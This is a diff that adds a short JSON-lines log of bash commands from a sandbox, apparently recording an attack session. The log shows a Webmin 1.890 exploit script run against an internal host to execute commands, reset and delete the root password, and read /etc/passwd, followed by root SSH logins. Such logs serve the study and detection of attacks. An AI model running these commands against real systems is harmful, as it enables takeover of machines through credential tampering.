@@ -1,0 +1,7 @@
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:55:26.665Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo \"est\"'"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:55:47.864Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'echo \"password\" | passwd --stdin root'"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:56:13.679Z", "cmd_type": "bash-command", "cmd": "ssh root@10.1.26.9"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:56:32.732Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'cat /etc/passwd'"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:57:24.826Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'passwd -d root'"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:57:44.865Z", "cmd_type": "bash-command", "cmd": "ssh root@10.1.26.9"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:57:49.994Z", "cmd_type": "bash-command", "cmd": "ip a"}
